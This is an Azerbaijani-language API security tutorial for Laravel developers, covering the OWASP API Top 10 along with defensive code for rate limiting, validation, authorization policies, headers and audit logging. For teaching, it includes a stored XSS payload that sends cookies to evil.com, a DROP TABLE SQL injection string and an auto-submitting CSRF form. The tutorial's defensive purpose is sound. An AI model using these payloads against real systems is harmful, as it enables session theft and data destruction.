# API Security (Senior)

## İcmal

API Security API-ların icazəsiz ərisim, data sızıntısı və müxtəlif hücumlardan qorunması üçün tətbiq olunan tədbir və texnikalar məcmusudur. Modern web tətbiqlərin böyük hissəsi API-lara əsaslandığından, API təhlükəsizliyi kritik əhəmiyyətə malikdir.

```
OWASP API Security Top 10 (2023):
1. Broken Object Level Authorization (BOLA)
2. Broken Authentication
3. Broken Object Property Level Authorization
4. Unrestricted Resource Consumption
5. Broken Function Level Authorization
6. Unrestricted Access to Sensitive Business Flows
7. Server-Side Request Forgery (SSRF)
8. Security Misconfiguration
9. Improper Inventory Management
10. Unsafe Consumption of APIs
```

## Niyə Vacibdir

API-lar birbaşa internet-ə açıq olduğundan hücum səthi genişdir. BOLA (Broken Object Level Authorization) — istifadəçinin başqasının məlumatlarına ərisməsi — ən çox görülən API vulnerability-dir. Bir SQL injection həm bütün databasei məhv edə bilər, həm də GDPR cəzası gətirər. Senior developer səviyyəsində hər endpoint-ə təhlükəsizlik perspektivindən baxmaq məcburidir.

## Əsas Anlayışlar

### Təhlükəsizlik Qatları

```
Internet
   |
   v
[WAF - Web Application Firewall]    -- Layer 1: Network Protection
   |
   v
[Rate Limiting]                      -- Layer 2: Abuse Prevention
   |
   v
[Authentication]                     -- Layer 3: Kim olduğun
   |
   v
[Authorization]                      -- Layer 4: Nə edə bilərsən
   |
   v
[Input Validation]                   -- Layer 5: Məlumat yoxlaması
   |
   v
[Business Logic]                     -- Layer 6: Əsasnamə yoxlaması
   |
   v
[Data Encryption]                    -- Layer 7: Məlumat şifrələməsi
   |
   v
[Logging & Monitoring]               -- Layer 8: İzləmə
```

### 1. SQL Injection

```
Təhlükəli:
  GET /api/users?search='; DROP TABLE users; --

  $query = "SELECT * FROM users WHERE name = '{$search}'";
  // SELECT * FROM users WHERE name = ''; DROP TABLE users; --'

Qorunma: Prepared statements / parameterized queries
```

### 2. XSS (Cross-Site Scripting)

```
Stored XSS:
  POST /api/comments
  {"body": "<script>document.location='https://evil.com?c='+document.cookie</script>"}

  API bu comment-i qaytaranda brauzer script-i icra edir.

Qorunma: Output encoding, Content-Security-Policy header
```

### 3. CSRF (Cross-Site Request Forgery)

```
Attacker-in saytında:
  <form action="https://bank.com/api/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
  </form>
  <script>document.forms[0].submit();</script>

  İstifadəçi bank.com-da login olubsa, brauzer cookie-ni avtomatik göndərir.

Qorunma: CSRF token, SameSite cookie, origin check
```

### 4. BOLA (Broken Object Level Authorization)

```
GET /api/users/42/orders    (öz sifarişlərin - OK)
GET /api/users/43/orders    (başqasının sifarişləri - BOLA!)

Hər zaman yoxlayın: bu user bu resource-a ərisə bilərmi?
```

### 5. Mass Assignment

```
POST /api/users
{"name": "Orkhan", "email": "...", "role": "admin"}
                                    ^^^^^^^^^^^^^^^^
  Əgər role field qorunmayıbsa, user özünü admin edə bilər!
```

## Praktik Baxış

**Defense in depth prinsipi:** Heç vaxt tək bir müdafiə qatına güvənməyin. Auth varsa belə input validation lazımdır, input validation varsa belə authorization lazımdır.

**Nə vaxt nəyə diqqət yetirin:**
- Public endpoint-lər: Rate limiting + input validation ön planda
- Private endpoint-lər: Authentication + authorization hər ikisi mütləq
- Admin endpoint-lər: Əlavə audit logging + ikifaktorlu auth

**Trade-off-lar:**
- Çox sıx rate limit — legitimate user-lər bloklanır
- Çox geniş CORS — third-party abuse
- Uzun session — revocation çətin olur

**Anti-pattern-lər:**
- Error message-lərdə stack trace qaytarmaq — internal detail sızır
- `$guarded = []` istifadə etmək — mass assignment açıq qalır
- Raw query-lər üçün `DB::select("... {$input}")` — SQL injection
- Authorization yalnız frontend-də — server-side olmadan işləmir
- API key-i URL query parameter kimi göndərmək — server log-larında görünür

## Nümunələr

### Ümumi Nümunə

BOLA attack ssenarisi:

```
Attacker: GET /api/orders/1001 (öz sifarişi) → 200 OK
Attacker: GET /api/orders/1002 (başqasının) → BOLA: 200 OK (yanlış!)
Doğru:    GET /api/orders/1002              → 403 Forbidden (authorization yoxlama)
```

### Kod Nümunəsi

**Rate Limiting:**

```php
// routes/api.php - Laravel built-in throttle
Route::middleware('throttle:60,1')->group(function () {
    // Dəqiqədə 60 request
    Route::apiResource('users', UserController::class);
});

// Custom rate limiter (app/Providers/AppServiceProvider.php)
use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Support\Facades\RateLimiter;

public function boot(): void
{
    // IP bazalı
    RateLimiter::for('api', function (Request $request) {
        return Limit::perMinute(60)->by($request->ip());
    });

    // User bazalı
    RateLimiter::for('authenticated', function (Request $request) {
        return $request->user()
            ? Limit::perMinute(100)->by($request->user()->id)
            : Limit::perMinute(10)->by($request->ip());
    });

    // Endpoint bazalı (login brute-force qorunması)
    RateLimiter::for('login', function (Request $request) {
        return [
            Limit::perMinute(5)->by($request->input('email')),
            Limit::perMinute(20)->by($request->ip()),
        ];
    });
}
```

**Input Validation:**

```php
namespace App\Http\Requests;

use Illuminate\Foundation\Http\FormRequest;

class StoreOrderRequest extends FormRequest
{
    public function rules(): array
    {
        return [
            // String validation
            'name' => ['required', 'string', 'max:255', 'regex:/^[\pL\s\-]+$/u'],

            // Email - RFC + DNS check
            'email' => ['required', 'email:rfc,dns', 'max:255'],

            // Integer - range
            'quantity' => ['required', 'integer', 'min:1', 'max:100'],

            // Decimal
            'price' => ['required', 'decimal:2', 'min:0.01', 'max:99999.99'],

            // Enum
            'status' => ['required', 'in:pending,processing,shipped,delivered'],

            // URL
            'website' => ['nullable', 'url:http,https', 'max:500'],

            // Array
            'items' => ['required', 'array', 'min:1', 'max:50'],
            'items.*.product_id' => ['required', 'exists:products,id'],
            'items.*.quantity' => ['required', 'integer', 'min:1'],

            // File
            'attachment' => ['nullable', 'file', 'max:5120', 'mimes:pdf,jpg,png'],

            // No HTML/script injection
            'description' => ['nullable', 'string', 'max:1000'],
        ];
    }

    /**
     * Input sanitization
     */
    protected function prepareForValidation(): void
    {
        $this->merge([
            'name' => strip_tags($this->name),
            'description' => strip_tags($this->description),
            'email' => strtolower(trim($this->email)),
        ]);
    }
}
```

**SQL Injection Protection:**

```php
// TƏHLÜKƏLİ - Raw query
$users = DB::select("SELECT * FROM users WHERE name = '$name'"); // ✗

// TƏHLÜKƏSİZ - Eloquent ORM (avtomatik parameterized)
$users = User::where('name', $name)->get(); // ✓

// TƏHLÜKƏSİZ - Query Builder (avtomatik parameterized)
$users = DB::table('users')->where('name', $name)->get(); // ✓

// TƏHLÜKƏSİZ - Raw query with bindings
$users = DB::select('SELECT * FROM users WHERE name = ?', [$name]); // ✓

// TƏHLÜKƏLİ - orderBy (column name bind olunmur!)
$users = User::orderBy($request->sort)->get(); // ✗

// TƏHLÜKƏSİZ - whitelist ilə
$allowed = ['name', 'email', 'created_at'];
$sort = in_array($request->sort, $allowed) ? $request->sort : 'created_at';
$users = User::orderBy($sort)->get(); // ✓
```

**XSS Protection:**

```php
// Blade template (avtomatik escape)
{{ $user->name }}           // ✓ htmlspecialchars() ilə escape olunur
{!! $user->bio !!}          // ✗ TƏHLÜKƏLİ - raw HTML

// Manual sanitize
use Illuminate\Support\Str;

$clean = strip_tags($input);
$clean = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
$clean = Str::of($input)->stripTags()->toString();

// Content-Security-Policy header
// app/Http/Middleware/SecurityHeaders.php
class SecurityHeaders
{
    public function handle(Request $request, Closure $next)
    {
        $response = $next($request);

        return $response
            ->header('X-Content-Type-Options', 'nosniff')
            ->header('X-Frame-Options', 'DENY')
            ->header('X-XSS-Protection', '1; mode=block')
            ->header('Strict-Transport-Security', 'max-age=31536000; includeSubDomains')
            ->header('Content-Security-Policy', "default-src 'self'; script-src 'self'")
            ->header('Referrer-Policy', 'strict-origin-when-cross-origin')
            ->header('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    }
}
```

**CSRF Protection:**

```php
// Laravel-də CSRF avtomatik qorunur (web routes üçün)
// API routes üçün token-based auth istifadə edin

// SPA üçün Sanctum CSRF:
// 1. GET /sanctum/csrf-cookie  (XSRF-TOKEN cookie alır)
// 2. POST /login               (Cookie avtomatik göndərilir)

// Manual CSRF yoxlaması
class ApiCsrfMiddleware
{
    public function handle(Request $request, Closure $next)
    {
        if ($request->isMethod('POST') || $request->isMethod('PUT')
            || $request->isMethod('DELETE')) {
            $token = $request->header('X-CSRF-TOKEN');
            if (!$token || $token !== session('csrf_token')) {
                abort(403, 'CSRF token mismatch');
            }
        }
        return $next($request);
    }
}
```

**Authorization (BOLA Protection):**

```php
// Policy ilə authorization
namespace App\Policies;

use App\Models\Order;
use App\Models\User;

class OrderPolicy
{
    public function view(User $user, Order $order): bool
    {
        return $user->id === $order->user_id
            || $user->hasRole('admin');
    }

    public function update(User $user, Order $order): bool
    {
        return $user->id === $order->user_id
            && $order->status === 'pending';
    }

    public function delete(User $user, Order $order): bool
    {
        return $user->id === $order->user_id
            && $order->status === 'pending';
    }
}

// Controller-də istifadə
class OrderController extends Controller
{
    public function show(Order $order): OrderResource
    {
        $this->authorize('view', $order); // 403 əgər icazə yoxdursa

        return new OrderResource($order);
    }

    // Scope ilə
    public function index(Request $request)
    {
        // User yalnız öz order-lərini görə bilər
        $orders = $request->user()->orders()->paginate();

        return OrderResource::collection($orders);
    }
}
```

**Mass Assignment Protection:**

```php
// app/Models/User.php

// Yalnız bu field-lər mass assign oluna bilər
protected $fillable = ['name', 'email', 'password'];

// Və ya: bu field-lər OLMAZ
protected $guarded = ['id', 'role', 'is_admin', 'email_verified_at'];

// API response-dan həssas məlumat çıxar
protected $hidden = ['password', 'remember_token', 'two_factor_secret'];
```

**API Key Authentication:**

```php
namespace App\Http\Middleware;

use App\Models\ApiKey;
use Closure;
use Illuminate\Http\Request;

class ValidateApiKey
{
    public function handle(Request $request, Closure $next)
    {
        $key = $request->header('X-API-Key')
            ?? $request->query('api_key');

        if (!$key) {
            return response()->json(['error' => 'API key required'], 401);
        }

        $apiKey = ApiKey::where('key', hash('sha256', $key))
            ->where('is_active', true)
            ->where(function ($q) {
                $q->whereNull('expires_at')
                  ->orWhere('expires_at', '>', now());
            })
            ->first();

        if (!$apiKey) {
            return response()->json(['error' => 'Invalid API key'], 401);
        }

        // Rate limit check
        $apiKey->increment('request_count');
        $apiKey->update(['last_used_at' => now()]);

        $request->merge(['api_key_model' => $apiKey]);

        return $next($request);
    }
}
```

**Logging & Monitoring:**

```php
namespace App\Http\Middleware;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Closure;

class ApiAuditLog
{
    public function handle(Request $request, Closure $next)
    {
        $response = $next($request);

        // Sensitive endpoint-ləri logla
        if ($this->shouldLog($request)) {
            Log::channel('api-audit')->info('API Request', [
                'method' => $request->method(),
                'path' => $request->path(),
                'ip' => $request->ip(),
                'user_id' => $request->user()?->id,
                'status' => $response->getStatusCode(),
                'user_agent' => $request->userAgent(),
                'duration_ms' => round((microtime(true) - LARAVEL_START) * 1000),
            ]);
        }

        // Uğursuz auth cəhd-lərini logla
        if ($response->getStatusCode() === 401 || $response->getStatusCode() === 403) {
            Log::channel('security')->warning('Auth failure', [
                'ip' => $request->ip(),
                'path' => $request->path(),
                'status' => $response->getStatusCode(),
            ]);
        }

        return $response;
    }

    private function shouldLog(Request $request): bool
    {
        return $request->isMethod('POST')
            || $request->isMethod('PUT')
            || $request->isMethod('DELETE');
    }
}
```

## Praktik Tapşırıqlar

1. **BOLA test:** `OrderController`-də authorization olmadan `/api/orders/{id}` endpoint-i yazın. Başqa user-in order ID-sini bilərək ərsim cəhdini simulate edin. Sonra `OrderPolicy` ilə düzəldin.

2. **SQL injection:** Test endpoint-i yazın. `?search='; DROP TABLE users; --` ilə test edin. Eloquent-in query log-larında parametrized query-ni göstərin.

3. **Rate limiter:** Login endpoint-inə `RateLimiter` tətbiq edin: email bazalı 5/dəq, IP bazalı 20/dəq. 6-cı cəhddə `429 Too Many Requests` aldığınızı yoxlayın.

4. **Security headers middleware:** `SecurityHeaders` middleware-ini yazın. Browser DevTools-da bütün header-lərin gəldiyini yoxlayın. CSP header-i ilə inline script-i blokladığınızı test edin.

5. **Mass assignment:** `User` modelinə `role` field-i əlavə edin. `$fillable`-dan çıxarın. POST request-ə `role: admin` əlavə edib işləmədiyini yoxlayın.

6. **Audit log:** `ApiAuditLog` middleware-ini bütün API route-larına tətbiq edin. DELETE əməliyyatından sonra log faylında girişi tapın. 401 cavabını alan cəhdləri ayrı log channel-ında yoxlayın.

## Əlaqəli Mövzular

- [OAuth 2.0](14-oauth2.md)
- [JWT - JSON Web Token](15-jwt.md)
- [CORS](16-cors.md)
- [API Rate Limiting](25-api-rate-limiting.md)
- [Network Security](26-network-security.md)
- [Zero Trust](33-zero-trust.md)
